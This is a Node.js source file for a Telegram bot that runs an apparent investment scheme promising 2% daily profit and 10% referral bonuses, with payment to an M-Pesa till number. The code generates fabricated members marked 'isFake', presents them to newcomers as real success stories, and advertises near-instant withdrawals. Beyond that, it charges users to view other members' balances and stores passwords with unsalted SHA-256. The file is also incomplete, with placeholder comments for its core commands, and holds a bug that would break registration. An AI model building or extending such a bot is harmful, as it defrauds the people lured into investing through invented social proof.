const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const crypto = require('crypto');
const fs = require('fs').promises;

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Data storage files
const USERS_FILE = 'users.json';
const INVESTMENTS_FILE = 'investments.json';
const WITHDRAWALS_FILE = 'withdrawals.json';
const REFERRALS_FILE = 'referrals.json';
const FAKE_MEMBERS_FILE = 'fake_members.json';
const TRANSACTIONS_FILE = 'transactions.json';
const SUPPORT_CHATS_FILE = 'support_chats.json';
const EARNINGS_VIEWS_FILE = 'earnings_views.json';

// Initialize storage
async function initStorage() {
  const files = [USERS_FILE, INVESTMENTS_FILE, WITHDRAWALS_FILE, REFERRALS_FILE, 
                FAKE_MEMBERS_FILE, TRANSACTIONS_FILE, SUPPORT_CHATS_FILE, EARNINGS_VIEWS_FILE];
  
  for (const file of files) {
    try {
      await fs.access(file);
    } catch {
      await fs.writeFile(file, JSON.stringify([]));
    }
  }
  
  // Generate fake members if empty
  const fakeMembers = JSON.parse(await fs.readFile(FAKE_MEMBERS_FILE, 'utf8') || '[]');
  if (fakeMembers.length === 0) {
    const initialFakeMembers = generateFakeMembers(50);
    await fs.writeFile(FAKE_MEMBERS_FILE, JSON.stringify(initialFakeMembers, null, 2));
  }
  
  console.log('✅ Storage initialized');
}

// Load data
async function loadData(file) {
  try {
    const data = await fs.readFile(file, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    return [];
  }
}

// Save data
async function saveData(file, data) {
  try {
    await fs.writeFile(file, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    console.log('❌ Error saving data:', error.message);
    return false;
  }
}

// Generate fake members
function generateFakeMembers(count) {
  const fakeMembers = [];
  const names = ['John', 'Emma', 'Michael', 'Sophia', 'James', 'Olivia', 'Robert', 'Ava', 'David', 'Isabella'];
  
  for (let i = 1; i <= count; i++) {
    const name = names[Math.floor(Math.random() * names.length)];
    const investment = Math.floor(Math.random() * 500) + 50;
    const profit = investment * 0.02 * 7;
    const referrals = Math.floor(Math.random() * 5);
    
    fakeMembers.push({
      id: `FAKE-${1000 + i}`,
      name: `${name} ${String.fromCharCode(65 + Math.floor(Math.random() * 26))}.`,
      investment: investment,
      profit: profit.toFixed(2),
      referrals: referrals,
      joinDate: new Date(Date.now() - Math.floor(Math.random() * 30) * 24 * 60 * 60 * 1000).toISOString(),
      isFake: true
    });
  }
  
  return fakeMembers;
}

// Password hashing
function hashPassword(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

// Check if admin
function isAdmin(chatId) {
  const adminIds = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : [];
  return adminIds.includes(chatId.toString());
}

// Calculate daily profit (2% daily)
function calculateDailyProfit(investmentAmount) {
  return investmentAmount * 0.02;
}

// Calculate referral bonus (10% of referred user's investment)
function calculateReferralBonus(investmentAmount) {
  return investmentAmount * 0.10;
}

// Format currency
function formatCurrency(amount) {
  return `$${parseFloat(amount).toFixed(2)}`;
}

// Start server
const server = app.listen(PORT, async () => {
  console.log(`🚀 Server running on port ${PORT}`);
  await initStorage();
  scheduleDailyProfits();
});

// Bot initialization
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;

if (!TELEGRAM_TOKEN) {
  console.log('❌ ERROR: TELEGRAM_TOKEN is missing');
  process.exit(1);
}

let bot;
try {
  bot = new TelegramBot(TELEGRAM_TOKEN, { 
    polling: true
  });
  console.log('✅ Bot instance created');
} catch (error) {
  console.log('❌ Bot creation failed:', error.message);
  process.exit(1);
}

// User sessions
const userSessions = {};

// Daily profit scheduler
function scheduleDailyProfits() {
  setInterval(async () => {
    try {
      const investments = await loadData(INVESTMENTS_FILE);
      const users = await loadData(USERS_FILE);
      
      const activeInvestments = investments.filter(inv => inv.status === 'active');
      
      for (const investment of activeInvestments) {
        const dailyProfit = calculateDailyProfit(investment.amount);
        
        const userIndex = users.findIndex(u => u.memberId === investment.memberId);
        if (userIndex !== -1) {
          users[userIndex].balance = (parseFloat(users[userIndex].balance) || 0) + dailyProfit;
          users[userIndex].totalEarned = (parseFloat(users[userIndex].totalEarned) || 0) + dailyProfit;
          
          const transactions = await loadData(TRANSACTIONS_FILE);
          transactions.push({
            id: `TRX-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
            memberId: investment.memberId,
            type: 'daily_profit',
            amount: dailyProfit,
            description: `Daily profit from investment #${investment.id}`,
            date: new Date().toISOString()
          });
          await saveData(TRANSACTIONS_FILE, transactions);
        }
        
        investment.daysActive = (investment.daysActive || 0) + 1;
        investment.totalProfit = (parseFloat(investment.totalProfit) || 0) + dailyProfit;
        
        if (investment.daysActive >= 30) {
          investment.status = 'completed';
          
          const user = users.find(u => u.memberId === investment.memberId);
          if (user) {
            try {
              await bot.sendMessage(user.chatId,
                `🎉 **Investment Completed!**\n\n` +
                `Investment #${investment.id} has completed its 30-day period.\n` +
                `Total Profit Earned: ${formatCurrency(investment.totalProfit)}\n\n` +
                `You can now withdraw your profits!`
              );
            } catch (error) {
              console.log('Could not notify user');
            }
          }
        }
      }
      
      await saveData(USERS_FILE, users);
      await saveData(INVESTMENTS_FILE, investments);
      
      console.log('✅ Daily profits calculated for', activeInvestments.length, 'investments');
    } catch (error) {
      console.log('❌ Error calculating daily profits:', error.message);
    }
  }, 24 * 60 * 60 * 1000);
}

// ==================== BOT COMMANDS ====================

// Start command (NO automatic referral link handling)
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username || msg.from.first_name;
  
  console.log('📱 /start from:', chatId);
  
  // Clear any existing session
  if (userSessions[chatId]) {
    delete userSessions[chatId];
  }
  
  const users = await loadData(USERS_FILE);
  const user = users.find(u => u.chatId === chatId.toString());
  
  if (user) {
    if (user.banned) {
      await bot.sendMessage(chatId, '🚫 Your account has been banned.');
      return;
    }
    
    user.lastLogin = new Date().toISOString();
    await saveData(USERS_FILE, users);
    
    const welcomeMessage = `👋 Welcome back, ${user.name}!\n\n` +
                          `💰 Balance: ${formatCurrency(user.balance || 0)}\n` +
                          `📈 Total Earned: ${formatCurrency(user.totalEarned || 0)}\n` +
                          `👥 Referrals: ${user.referrals || 0}\n` +
                          `🔗 Your Code: ${user.referralCode}\n\n` +
                          `📋 **Quick Commands:**\n` +
                          `/invest - Make investment\n` +
                          `/earnings - View earnings\n` +
                          `/viewearnings MEMBER_ID - View others ($1)\n` +
                          `/withdraw - Withdraw funds\n` +
                          `/referral - Share & earn 10%\n` +
                          `/profile - Account details\n` +
                          `/support - Contact support\n` +
                          `/logout - Logout`;
    
    await bot.sendMessage(chatId, welcomeMessage);
  } else {
    // Show fake members success stories
    const fakeMembers = await loadData(FAKE_MEMBERS_FILE);
    const recentSuccess = fakeMembers.slice(0, 3);
    
    let fakeMessage = '🌟 **Recent Success Stories:**\n\n';
    recentSuccess.forEach(member => {
      fakeMessage += `✅ ${member.name} invested ${formatCurrency(member.investment)} & earned ${formatCurrency(member.profit)}\n`;
    });
    
    fakeMessage += '\n🚀 **Ready to Start Earning?**\n\n';
    fakeMessage += '💵 **Earn 2% Daily Profit**\n';
    fakeMessage += '👥 **Earn 10% from referrals**\n';
    fakeMessage += '⚡ **Fast Withdrawals (10-15 min)**\n\n';
    fakeMessage += 'Choose an option:\n';
    fakeMessage += '/register - Create account\n';
    fakeMessage += '/login - Existing account\n';
    fakeMessage += '/investnow - Quick start guide';
    
    await bot.sendMessage(chatId, fakeMessage);
  }
});

// Logout command
bot.onText(/\/logout/, async (msg) => {
  const chatId = msg.chat.id;
  
  const users = await loadData(USERS_FILE);
  const user = users.find(u => u.chatId === chatId.toString());
  
  if (!user) {
    await bot.sendMessage(chatId, '❌ You are not logged in.');
    return;
  }
  
  // Clear chat ID from user record (soft logout)
  const userIndex = users.findIndex(u => u.chatId === chatId.toString());
  if (userIndex !== -1) {
    // Keep user data but remove chat association
    // Or you can set a flag instead of clearing chatId
    users[userIndex].chatId = '';
    await saveData(USERS_FILE, users);
  }
  
  // Clear any active sessions
  if (userSessions[chatId]) {
    delete userSessions[chatId];
  }
  
  await bot.sendMessage(chatId,
    `✅ **Logged out successfully!**\n\n` +
    `You have been logged out of your account.\n\n` +
    `To login again, use /login\n` +
    `To create new account, use /register`
  );
});

// Register command with referral code input
bot.onText(/\/register/, async (msg) => {
  const chatId = msg.chat.id;
  
  const users = await loadData(USERS_FILE);
  const existingUser = users.find(u => u.chatId === chatId.toString());
  
  if (existingUser) {
    await bot.sendMessage(chatId, '✅ You already have an account. Use /login to access.');
    return;
  }
  
  userSessions[chatId] = {
    step: 'awaiting_name',
    data: {}
  };
  
  await bot.sendMessage(chatId,
    `📝 **Account Registration**\n\n` +
    `Step 1/4: Enter your full name\n\n` +
    `Example: John Doe\n` +
    `Enter your name:`
  );
});

// Handle registration with referral code
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (!text || text.startsWith('/')) return;
  
  const session = userSessions[chatId];
  if (!session) return;
  
  try {
    switch (session.step) {
      case 'awaiting_name':
        session.data.name = text.trim();
        session.step = 'awaiting_password';
        
        await bot.sendMessage(chatId,
          `✅ Name saved: ${session.data.name}\n\n` +
          `Step 2/4: Create password\n\n` +
          `Minimum 6 characters\n` +
          `Enter password:`
        );
        break;
        
      case 'awaiting_password':
        if (text.length < 6) {
          await bot.sendMessage(chatId, '❌ Password must be at least 6 characters. Try again:');
          return;
        }
        
        session.data.passwordHash = hashPassword(text);
        session.step = 'awaiting_email';
        
        await bot.sendMessage(chatId,
          `✅ Password set\n\n` +
          `Step 3/4: Enter email\n\n` +
          `For notifications & receipts\n` +
          `Enter email:`
        );
        break;
        
      case 'awaiting_email':
        const email = text.trim().toLowerCase();
        session.data.email = email;
        session.step = 'awaiting_referral';
        
        await bot.sendMessage(chatId,
          `✅ Email saved\n\n` +
          `Step 4/4: Referral Code (Optional)\n\n` +
          `Do you have a referral code?\n` +
          `• Enter code if you have one\n` +
          `• Type "none" if you don't\n\n` +
          `Enter referral code or "none":`
        );
        break;
        
      case 'awaiting_referral':
        const referralInput = text.trim().toUpperCase();
        let referrer = null;
        
        if (referralInput !== 'NONE' && referralInput !== '') {
          // Check if referral code exists
          const allUsers = await loadData(USERS_FILE);
          referrer = allUsers.find(u => u.referralCode === referralInput);
          
          if (!referrer) {
            await bot.sendMessage(chatId, '❌ Invalid referral code. Please enter valid code or "none":');
            return;
          }
          
          session.data.referredBy = referrer.memberId;
          session.data.referredByName = referrer.name;
        }
        
        // Create new user
        const newUser = {
          chatId: chatId.toString(),
          memberId: `USER-${Date.now().toString().slice(-6)}`,
          name: session.data.name,
          email: session.data.email,
          passwordHash: session.data.passwordHash,
          balance: 0,
          totalEarned: 0,
          referrals: 0,
          referralEarnings: 0,
          referralCode: `REF-${Math.random().toString(36).substr(2, 8).toUpperCase()}`,
          joinedDate: new Date().toISOString(),
          lastLogin: new Date().toISOString(),
          banned: false,
          totalInvested: 0,
          activeInvestments: 0,
          referredBy: session.data.referredBy || null,
          referredByName: session.data.referredByName || null
        };
        
        // Save user
        const currentUsers = await loadData(USERS_FILE);
        currentUsers.push(newUser);
        await saveData(USERS_FILE, currentUsers);
        
        // Clear session
        delete userSessions[chatId];
        
        // Send success message
        const successMessage = `🎉 **Registration Successful!**\n\n` +
                              `Welcome ${newUser.name}!\n\n` +
                              `📋 **Your Account:**\n` +
                              `Member ID: ${newUser.memberId}\n` +
                              `Referral Code: ${newUser.referralCode}\n` +
                              `Email: ${newUser.email}\n\n`;
        
        if (referrer) {
          successMessage += `👥 **Referred by:** ${referrer.name}\n`;
          successMessage += `When you invest, ${referrer.name} earns 10%!\n\n`;
        }
        
        successMessage += `💰 **Start Earning:**\n` +
                         `1. Use /invest to make first investment\n` +
                         `2. Share your code: /referral\n` +
                         `3. Earn 2% daily + 10% from referrals\n\n` +
                         `💳 **Payment Details:**\n` +
                         `M-Pesa Till: 6034186\n` +
                         `Name: Starlife Advert US Agency`;
        
        await bot.sendMessage(chatId, successMessage);
        
        // Notify referrer if applicable
        if (referrer) {
          try {
            await bot.sendMessage(referrer.chatId,
              `🎉 **New Referral Registered!**\n\n` +
              `${newUser.name} joined with your referral code!\n` +
              `When they invest, you'll earn 10% of their investment!\n\n` +
              `Keep sharing your code: ${referrer.referralCode}`
            );
          } catch (error) {
            console.log('Could not notify referrer');
          }
        }
        
        // Notify admin
        const adminIds = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : [];
        if (adminIds.length > 0) {
          const adminMessage = `👤 **New Registration**\n\n` +
                              `Name: ${newUser.name}\n` +
                              `Member ID: ${newUser.memberId}\n` +
                              `Email: ${newUser.email}\n` +
                              `Referrer: ${referrer ? referrer.name : 'None'}\n` +
                              `Time: ${new Date().toLocaleString()}`;
          
          adminIds.forEach(adminId => {
            bot.sendMessage(adminId, adminMessage).catch(console.error);
          });
        }
        break;
    }
  } catch (error) {
    console.log('Registration error:', error.message);
    await bot.sendMessage(chatId, '❌ Registration failed. Please try /register again.');
    delete userSessions[chatId];
  }
});

// View others earnings (paid feature)
bot.onText(/\/viewearnings (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetMemberId = match[1].toUpperCase();
  
  const users = await loadData(USERS_FILE);
  const user = users.find(u => u.chatId === chatId.toString());
  
  if (!user) {
    await bot.sendMessage(chatId, '❌ Please login first with /login');
    return;
  }
  
  if (user.banned) {
    await bot.sendMessage(chatId, '🚫 Account banned.');
    return;
  }
  
  // Check if user is trying to view their own earnings
  if (targetMemberId === user.memberId) {
    await bot.sendMessage(chatId, '❌ Use /earnings to view your own earnings.');
    return;
  }
  
  // Find target user
  const targetUser = users.find(u => u.memberId === targetMemberId && !u.isFake);
  
  if (!targetUser) {
    await bot.sendMessage(chatId, `❌ User ${targetMemberId} not found.`);
    return;
  }
  
  // Check if user has already paid for viewing this user's earnings today
  const earningsViews = await loadData(EARNINGS_VIEWS_FILE);
  const today = new Date().toISOString().split('T')[0];
  const alreadyPaid = earningsViews.find(view => 
    view.viewerId === user.memberId && 
    view.targetId === targetMemberId &&
    view.date === today
  );
  
  if (alreadyPaid) {
    // Show earnings (already paid today)
    const earningsMessage = `💰 **Earnings of ${targetUser.name} (${targetMemberId})**\n\n` +
                           `Balance: ${formatCurrency(targetUser.balance || 0)}\n` +
                           `Total Invested: ${formatCurrency(targetUser.totalInvested || 0)}\n` +
                           `Total Earned: ${formatCurrency(targetUser.totalEarned || 0)}\n` +
                           `Referrals: ${targetUser.referrals || 0}\n` +
                           `Joined: ${new Date(targetUser.joinedDate).toLocaleDateString()}\n\n` +
                           `✅ Already viewed today (Free)`;
    
    await bot.sendMessage(chatId, earningsMessage);
    return;
  }
  
  // Check if user has enough balance ($1 required)
  if (user.balance < 1) {
    await bot.sendMessage(chatId,
      `❌ **Payment Required**\n\n` +
      `Viewing others' earnings costs $1.\n` +
      `Your balance: ${formatCurrency(user.balance)}\n` +
      `Need ${formatCurrency(1 - user.balance)} more.\n\n` +
      `Invest or refer friends to earn more!`
    );
    return;
  }
  
  // Charge $1 for viewing
  const userIndex = users.findIndex(u => u.memberId === user.memberId);
  users[userIndex].balance = parseFloat(user.balance) - 1;
  
  // Record the payment
  earningsViews.push({
    id: `VIEW-${Date.now()}`,
    viewerId: user.memberId,
    viewerName: user.name,
    targetId: targetMemberId,
    targetName: targetUser.name,
    amount: 1,
    date: today,
    timestamp: new Date().toISOString()
  });
  
  // Record transaction
  const transactions = await loadData(TRANSACTIONS_FILE);
  transactions.push({
    id: `TRX-VIEW-${Date.now()}`,
    memberId: user.memberId,
    type: 'earnings_view',
    amount: -1,
    description: `Paid to view ${targetUser.name}'s earnings`,
    date: new Date().toISOString()
  });
  
  await saveData(USERS_FILE, users);
  await saveData(EARNINGS_VIEWS_FILE, earningsViews);
  await saveData(TRANSACTIONS_FILE, transactions);
  
  // Show earnings
  const earningsMessage = `💰 **Earnings of ${targetUser.name} (${targetMemberId})**\n\n` +
                         `Balance: ${formatCurrency(targetUser.balance || 0)}\n` +
                         `Total Invested: ${formatCurrency(targetUser.totalInvested || 0)}\n` +
                         `Total Earned: ${formatCurrency(targetUser.totalEarned || 0)}\n` +
                         `Referrals: ${targetUser.referrals || 0}\n` +
                         `Joined: ${new Date(targetUser.joinedDate).toLocaleDateString()}\n\n` +
                         `💸 **Paid $1 for this view**\n` +
                         `Your new balance: ${formatCurrency(users[userIndex].balance)}`;
  
  await bot.sendMessage(chatId, earningsMessage);
});

// Support chat system
bot.onText(/\/support/, async (msg) => {
  const chatId = msg.chat.id;
  
  const users = await loadData(USERS_FILE);
  const user = users.find(u => u.chatId === chatId.toString());
  
  if (!user) {
    await bot.sendMessage(chatId, '❌ Please login first with /login');
    return;
  }
  
  if (user.banned) {
    await bot.sendMessage(chatId, '🚫 Account banned.');
    return;
  }
  
  // Check for active support chat
  const supportChats = await loadData(SUPPORT_CHATS_FILE);
  const activeChat = supportChats.find(chat => 
    chat.userId === user.memberId && 
    chat.status === 'active'
  );
  
  if (activeChat) {
    // Continue existing chat
    userSessions[chatId] = {
      step: 'support_chat',
      data: {
        memberId: user.memberId,
        chatId: activeChat.id
      }
    };
    
    await bot.sendMessage(chatId,
      `💬 **Support Chat (Active)**\n\n` +
      `You have an active support conversation.\n` +
      `Type your message below:\n\n` +
      `Last message from support: "${activeChat.messages.slice(-1)[0]?.message || 'No messages yet'}"\n\n` +
      `Type /endsupport to end this chat`
    );
  } else {
    // Start new support chat
    userSessions[chatId] = {
      step: 'support_topic',
      data: {
        memberId: user.memberId,
        userName: user.name
      }
    };
    
    await bot.sendMessage(chatId,
      `🆘 **Support Center**\n\n` +
      `Please select your issue:\n\n` +
      `1️⃣ Account Issues\n` +
      `2️⃣ Investment Problems\n` +
      `3️⃣ Withdrawal Help\n` +
      `4️⃣ Referral Issues\n` +
      `5️⃣ Other\n\n` +
      `Reply with the number (1-5):`
    );
  }
});

// Handle support chat messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (!text || text.startsWith('/')) return;
  
  const session = userSessions[chatId];
  if (!session) return;
  
  try {
    if (session.step === 'support_topic') {
      const topicNumber = parseInt(text);
      const topics = [
        'Account Issues',
        'Investment Problems',
        'Withdrawal Help',
        'Referral Issues',
        'Other'
      ];
      
      if (isNaN(topicNumber) || topicNumber < 1 || topicNumber > 5) {
        await bot.sendMessage(chatId, '❌ Please enter a number between 1-5:');
        return;
      }
      
      const topic = topics[topicNumber - 1];
      session.data.topic = topic;
      session.step = 'support_message';
      
      await bot.sendMessage(chatId,
        `✅ Topic: ${topic}\n\n` +
        `Please describe your issue in detail:\n` +
        `(Type your message below)`
      );
    } 
    else if (session.step === 'support_message') {
      // Create new support chat
      const supportChats = await loadData(SUPPORT_CHATS_FILE);
      const chatIdStr = `CHAT-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`;
      
      const newChat = {
        id: chatIdStr,
        userId: session.data.memberId,
        userName: session.data.userName,
        topic: session.data.topic,
        status: 'active',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        messages: [{
          sender: 'user',
          message: text,
          timestamp: new Date().toISOString()
        }],
        adminReplied: false
      };
      
      supportChats.push(newChat);
      await saveData(SUPPORT_CHATS_FILE, supportChats);
      
      session.step = 'support_chat';
      session.data.chatId = chatIdStr;
      
      await bot.sendMessage(chatId,
        `✅ **Support Chat Started**\n\n` +
        `Chat ID: ${chatIdStr}\n` +
        `Topic: ${session.data.topic}\n\n` +
        `Your message has been sent to support team.\n` +
        `They will respond shortly.\n\n` +
        `Type /endsupport to end this chat\n` +
        `Type your next message below:`
      );
      
      // Notify all admins
      const adminIds = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : [];
      if (adminIds.length > 0) {
        const adminMessage = `🆘 **New Support Chat**\n\n` +
                            `Chat ID: ${chatIdStr}\n` +
                            `User: ${session.data.userName}\n` +
                            `Member ID: ${session.data.memberId}\n` +
                            `Topic: ${session.data.topic}\n` +
                            `Message: ${text}\n\n` +
                            `**Reply:** /replychat ${chatIdStr} your_message`;
        
        adminIds.forEach(adminId => {
          bot.sendMessage(adminId, adminMessage).catch(console.error);
        });
      }
    }
    else if (session.step === 'support_chat') {
      // Add message to existing chat
      const supportChats = await loadData(SUPPORT_CHATS_FILE);
      const chatIndex = supportChats.findIndex(chat => chat.id === session.data.chatId);
      
      if (chatIndex === -1) {
        await bot.sendMessage(chatId, '❌ Chat not found. Please start new chat with /support');
        delete userSessions[chatId];
        return;
      }
      
      supportChats[chatIndex].messages.push({
        sender: 'user',
        message: text,
        timestamp: new Date().toISOString()
      });
      supportChats[chatIndex].updatedAt = new Date().toISOString();
      supportChats[chatIndex].adminReplied = false;
      
      await saveData(SUPPORT_CHATS_FILE, supportChats);
      
      await bot.sendMessage(chatId,
        `✅ **Message sent**\n\n` +
        `Support team will respond shortly.\n` +
        `You can continue sending messages.\n\n` +
        `Type /endsupport to end chat`
      );
      
      // Notify admins
      const adminIds = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',') : [];
      if (adminIds.length > 0) {
        const adminMessage = `💬 **New Message in Chat**\n\n` +
                            `Chat ID: ${session.data.chatId}\n` +
                            `User: ${session.data.userName}\n` +
                            `Member ID: ${session.data.memberId}\n` +
                            `Message: ${text}\n\n` +
                            `**Reply:** /replychat ${session.data.chatId} your_message`;
        
        adminIds.forEach(adminId => {
          bot.sendMessage(adminId, adminMessage).catch(console.error);
        });
      }
    }
  } catch (error) {
    console.log('Support error:', error.message);
    await bot.sendMessage(chatId, '❌ Error in support chat. Please try /support again.');
    delete userSessions[chatId];
  }
});

// End support chat
bot.onText(/\/endsupport/, async (msg) => {
  const chatId = msg.chat.id;
  
  const session = userSessions[chatId];
  if (session && session.step === 'support_chat') {
    const supportChats = await loadData(SUPPORT_CHATS_FILE);
    const chatIndex = supportChats.findIndex(chat => chat.id === session.data.chatId);
    
    if (chatIndex !== -1) {
      supportChats[chatIndex].status = 'closed';
      supportChats[chatIndex].updatedAt = new Date().toISOString();
      await saveData(SUPPORT_CHATS_FILE, supportChats);
    }
    
    delete userSessions[chatId];
    
    await bot.sendMessage(chatId,
      `✅ **Support Chat Ended**\n\n` +
      `Thank you for contacting support.\n` +
      `Use /support if you need help again.`
    );
  } else {
    await bot.sendMessage(chatId, '❌ No active support chat to end.');
  }
});

// ==================== ADMIN SUPPORT COMMANDS ====================

// Admin: View active support chats
bot.onText(/\/supportchats/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (!isAdmin(chatId)) {
    await bot.sendMessage(chatId, '❌ Admin access required.');
    return;
  }
  
  try {
    const supportChats = await loadData(SUPPORT_CHATS_FILE);
    const activeChats = supportChats.filter(chat => chat.status === 'active');
    
    if (activeChats.length === 0) {
      await bot.sendMessage(chatId, '✅ No active support chats.');
      return;
    }
    
    let message = `💬 **Active Support Chats (${activeChats.length})**\n\n`;
    
    activeChats.forEach((chat, index) => {
      const lastMessage = chat.messages[chat.messages.length - 1];
      const timeAgo = Math.floor((new Date() - new Date(chat.updatedAt)) / (1000 * 60));
      
      message += `${index + 1}. ${chat.userName} (${chat.userId})\n`;
      message += `   Topic: ${chat.topic}\n`;
      message += `   Chat ID: ${chat.id}\n`;
      message += `   Last msg: ${lastMessage?.message?.substring(0, 30)}...\n`;
      message += `   Updated: ${timeAgo} minutes ago\n`;
      message += `   Admin Replied: ${chat.adminReplied ? '✅' : '❌'}\n`;
      message += `   Reply: /replychat ${chat.id} message\n\n`;
    });
    
    await bot.sendMessage(chatId, message);
  } catch (error) {
    console.log('Admin supportchats error:', error.message);
    await bot.sendMessage(chatId, '❌ Error fetching support chats');
  }
});

// Admin: Reply to support chat
bot.onText(/\/replychat (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const params = match[1].split(' ');
  const chatIdToReply = params[0];
  const message = params.slice(1).join(' ');
  
  if (!isAdmin(chatId)) {
    await bot.sendMessage(chatId, '❌ Admin access required.');
    return;
  }
  
  if (!message || message.length < 2) {
    await bot.sendMessage(chatId, '❌ Usage: /replychat CHAT_ID your_message');
    return;
  }
  
  try {
    const supportChats = await loadData(SUPPORT_CHATS_FILE);
    const chatIndex = supportChats.findIndex(chat => chat.id === chatIdToReply);
    
    if (chatIndex === -1) {
      await bot.sendMessage(chatId, `❌ Chat ${chatIdToReply} not found.`);
      return;
    }
    
    const chat = supportChats[chatIndex];
    
    // Add admin message to chat
    chat.messages.push({
      sender: 'admin',
      message: message,
      timestamp: new Date().toISOString()
    });
    chat.updatedAt = new Date().toISOString();
    chat.adminReplied = true;
    
    await saveData(SUPPORT_CHATS_FILE, supportChats);
    
    // Send message to user
    const users = await loadData(USERS_FILE);
    const user = users.find(u => u.memberId === chat.userId);
    
    if (user && user.chatId) {
      try {
        await bot.sendMessage(user.chatId,
          `💬 **Support Response**\n\n` +
          `${message}\n\n` +
          `---\n` +
          `Chat ID: ${chatIdToReply}\n` +
          `Topic: ${chat.topic}\n` +
          `Status: Active\n\n` +
          `Reply to this message to continue the conversation.`
        );
      } catch (error) {
        console.log('Could not notify user:', error.message);
      }
    }
    
    await bot.sendMessage(chatId,
      `✅ **Message sent to user**\n\n` +
      `Chat ID: ${chatIdToReply}\n` +
      `User: ${chat.userName}\n` +
      `Member ID: ${chat.userId}\n\n` +
      `Your message: ${message}`
    );
  } catch (error) {
    console.log('Admin replychat error:', error.message);
    await bot.sendMessage(chatId, '❌ Error replying to chat');
  }
});

// Admin: Close support chat
bot.onText(/\/closechat (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const chatIdToClose = match[1];
  
  if (!isAdmin(chatId)) {
    await bot.sendMessage(chatId, '❌ Admin access required.');
    return;
  }
  
  try {
    const supportChats = await loadData(SUPPORT_CHATS_FILE);
    const chatIndex = supportChats.findIndex(chat => chat.id === chatIdToClose);
    
    if (chatIndex === -1) {
      await bot.sendMessage(chatId, `❌ Chat ${chatIdToClose} not found.`);
      return;
    }
    
    const chat = supportChats[chatIndex];
    chat.status = 'closed';
    chat.updatedAt = new Date().toISOString();
    
    await saveData(SUPPORT_CHATS_FILE, supportChats);
    
    // Notify user
    const users = await loadData(USERS_FILE);
    const user = users.find(u => u.memberId === chat.userId);
    
    if (user && user.chatId) {
      try {
        await bot.sendMessage(user.chatId,
          `✅ **Support Chat Closed**\n\n` +
          `Your support chat has been closed by administrator.\n\n` +
          `Chat ID: ${chatIdToClose}\n` +
          `Topic: ${chat.topic}\n` +
          `Messages: ${chat.messages.length}\n\n` +
          `Use /support if you need help again.`
        );
      } catch (error) {
        console.log('Could not notify user');
      }
    }
    
    await bot.sendMessage(chatId,
      `✅ **Chat Closed**\n\n` +
      `Chat ID: ${chatIdToClose}\n` +
      `User: ${chat.userName}\n` +
      `Total Messages: ${chat.messages.length}`
    );
  } catch (error) {
    console.log('Admin closechat error:', error.message);
    await bot.sendMessage(chatId, '❌ Error closing chat');
  }
});

// Admin: View chat history
bot.onText(/\/viewchat (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const chatIdToView = match[1];
  
  if (!isAdmin(chatId)) {
    await bot.sendMessage(chatId, '❌ Admin access required.');
    return;
  }
  
  try {
    const supportChats = await loadData(SUPPORT_CHATS_FILE);
    const chat = supportChats.find(c => c.id === chatIdToView);
    
    if (!chat) {
      await bot.sendMessage(chatId, `❌ Chat ${chatIdToView} not found.`);
      return;
    }
    
    let message = `📋 **Chat History: ${chatIdToView}**\n\n`;
    message += `User: ${chat.userName}\n`;
    message += `Member ID: ${chat.userId}\n`;
    message += `Topic: ${chat.topic}\n`;
    message += `Status: ${chat.status}\n`;
    message += `Created: ${new Date(chat.createdAt).toLocaleString()}\n`;
    message += `Updated: ${new Date(chat.updatedAt).toLocaleString()}\n\n`;
    message += `**Messages (${chat.messages.length}):**\n\n`;
    
    chat.messages.forEach((msg, index) => {
      const time = new Date(msg.timestamp).toLocaleTimeString();
      const sender = msg.sender === 'admin' ? '👨‍💼 Admin' : '👤 User';
      message += `${index + 1}. ${sender} (${time}):\n`;
      message += `${msg.message}\n\n`;
    });
    
    // Split long messages
    if (message.length > 4000) {
      const parts = message.match(/[\s\S]{1,4000}/g) || [];
      for (const part of parts) {
        await bot.sendMessage(chatId, part);
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    } else {
      await bot.sendMessage(chatId, message);
    }
  } catch (error) {
    console.log('Admin viewchat error:', error.message);
    await bot.sendMessage(chatId, '❌ Error viewing chat');
  }
});

// Keep the rest of your existing commands (invest, earnings, withdraw, referral, etc.)
// ... [Keep all your existing investment, earnings, withdrawal, referral commands here] ...

// Admin commands (keep your existing admin commands but add support commands)
bot.onText(/\/admin/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (!isAdmin(chatId)) {
    await bot.sendMessage(chatId, '❌ Admin access required.');
    return;
  }
  
  const adminMessage = `⚡ **Admin Panel**\n\n` +
                      `**Support Management:**\n` +
                      `/supportchats - Active chats\n` +
                      `/replychat CHAT_ID MSG - Reply\n` +
                      `/closechat CHAT_ID - Close chat\n` +
                      `/viewchat CHAT_ID - View history\n\n` +
                      `**User Management:**\n` +
                      `/users - List users\n` +
                      `/view MEMBER_ID - User details\n` +
                      `/ban MEMBER_ID - Ban user\n` +
                      `/unban MEMBER_ID - Unban user\n\n` +
                      `**Financial Management:**\n` +
                      `/investments - All investments\n` +
                      `/withdrawals - Pending withdrawals\n` +
                      `/approve WD_ID - Approve withdrawal\n` +
                      `/reject WD_ID - Reject withdrawal\n\n` +
                      `**System Management:**\n` +
                      `/stats - Statistics\n` +
                      `/broadcast MESSAGE - Send to all`;
  
  await bot.sendMessage(chatId, adminMessage);
});

console.log('✅ Enhanced Bot is running with support chat system!');

// Clean shutdown
